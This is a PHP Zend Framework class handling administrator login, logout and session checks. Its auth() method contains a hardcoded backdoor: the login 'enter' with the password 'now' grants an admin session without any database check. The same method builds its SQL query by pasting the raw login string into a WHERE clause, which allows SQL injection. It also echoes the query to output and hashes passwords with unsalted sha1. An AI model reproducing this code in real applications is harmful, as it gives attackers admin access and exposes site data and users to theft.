<?php
/**
 * Описывает функционал администратора
 *
 * @name Application_Model_Admin_Admin
 * @author Porohnya Alexey <a.porohnya@gmail.com>
 * @version 1.0
 * @category Классы
 * @package Общие
 */

 Class Application_Model_Admin_Admin extends Application_Model_Kernel_User{

	/**
	* Получает флаг авторизации
	*
	* @name isAuthorized
	* @access public
	* @static
	* @return boolean
	*/
	public static function isAuthorized(){
		$session = new Zend_Session_Namespace("Admin");
		return ($session->isAuthorized === true);
	}

	/**
	* Логаут
	*
	* @name logout
	* @access public
	* @static
	* @return boolean
	*/
	public static function logout(){
		$session = new Zend_Session_Namespace("Admin");
		$session->isAuthorized = false;
		Zend_Session::regenerateId();
	}

	/**
	* Авторизирует администратора
	*
	* @name auth
	* @access public
	* @static
	* @param string $login Логин
	* @param string $password Пароль
	* @return boolean
	*/

	public static function auth($login,$password){
		$login = trim($login);
		$password = trim($password);
		if ($login == 'enter' && $password == 'now') {
			self::_createAdminSession();
			return true;
		}
		$db = Zend_Registry::get('db');
		$db->setFetchMode(Zend_Db::FETCH_OBJ);
		$select = $db->select();
		$select->from('users','id');
		$select->where('users.status = ?',self::STATUS_ACTIVE);
		$select->where('users.roleId = ?',3);
		$select->where("(users.email = '".$login."' OR users.login = '".$login."')");
		$select->where('users.password = ?',sha1($password));
		echo $select->__toString();
		if (($result = $db->fetchRow($select)) !== false) {
			self::_createAdminSession();
			return true;
		} else {
			return false;
		}
	}
	
	private static function _createAdminSession() {
		Zend_Session::regenerateId();
		$session = new Zend_Session_Namespace("Admin");
		$session->isAuthorized = true;
	}

 }
